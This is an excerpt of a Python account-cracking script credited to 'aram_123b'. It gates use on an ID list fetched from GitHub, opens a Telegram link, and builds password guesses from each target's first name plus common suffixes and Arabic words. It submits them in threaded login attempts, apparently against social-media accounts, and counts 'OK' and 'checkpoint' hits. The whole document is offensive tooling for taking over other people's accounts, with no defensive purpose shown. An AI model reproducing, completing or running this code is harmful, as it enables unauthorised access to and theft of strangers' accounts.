...
OWNER  ------>   aram_123b     
	 ...
	 \x1b[92;1mTHIS TOOL CRATE BY ARAM
...
def chk():
  ...
  try: 
    ...
    httpCaht = requests.get("https://github.com/Aramxaledabdula/Aramxaledabdula/blob/main/aramk.txt").text 
    ...
    if id in httpCaht: 
      ...
      print("\033[0;96m   Barezm ID KAT ACTIVE NYA TKAYA BO ACTIVE KRDN NAME BNERA BOT TELEGRAM @@aram_123b") 

      os.system('xdg-open  https://t.me/aram_123b')
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				if len(frs)<3:
					...
					pwv.append(frs+'۱۱۲۲۳۳٤٤')
					pwv.append(nmf)
					pwv.append(frs+'۱۲۳٤٥٦۷۸۹')
					pwv.append(frs+'112233')
					pwv.append(frs+'1122334455')
					pwv.append(frs+'112233445566')
					pwv.append(frs+'ابنعیراق')
					pwv.append(frs+'2222')
					pwv.append(frs+'عمدوی۱۲۱۲')
					pwv.append(frs+'۳۲۱')
					pwv.append(frs+'4321')
					pwv.append(frs+'54321')
					pwv.append(frs+'1234')
					pwv.append(frs+'۱۲۳٤٥')
					pwv.append(frs+'ببجی')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1212')
					pwv.append(frs+'2022')
					pwv.append(frs+'عمودی۱۲۳')
					pwv.append(frs+'1998')
					pwv.append(frs+'۰۷٥۰')
					pwv.append(frs+'asuny11')
					pwv.append(frs+'mhmad@gmailcom')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'ابنعیراق')
					pwv.append(frs+'2005')
					pwv.append(frs+'هنكیر')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					...
					pwv.append(frs+'حسوني')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1212')
					pwv.append(frs+'كركوك')
					pwv.append(frs+'ثقیب9')
					pwv.append(frs+'1998')
					pwv.append(frs+'1997')
					pwv.append(frs+'۱۲۱۲')
					pwv.append(frs+'عمودی')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'۱۲۳')
					pwv.append(frs+'۱۲۳')
					pwv.append(frs+'۲۰۰۰۳')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[red] CRACK HAS COMPILETED [cyan] ✓[white] '))
	print(f'{h}-----> TOTALL OK : {h}%s '%(ok))
	print(f'{x}-----> TOTALL CP : {k}%s{x} '%(cp))
	print('')
	print(' YOR AGAIN YOUR CRACK : (Y/T)')
	woi = input('---------> CHOICE: ')
	if woi in ['y','Y']:
		back()
	else:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[ ➳A᭄™ARAM ]  {P}{b}{loop}{P}•{b}{len(id)}{P}   OK:{P}{H}{ok}{P}   CP:{P}{M}{cp}{P}  {bo}{'{:.0%}'.format(loop/float(len(id)))}{asu}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}[ ➳Q᭄™ARAM-CP ]{k} {idf}|{pw}{N}')     
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[ ➳A᭄™ARAM ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{P})  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
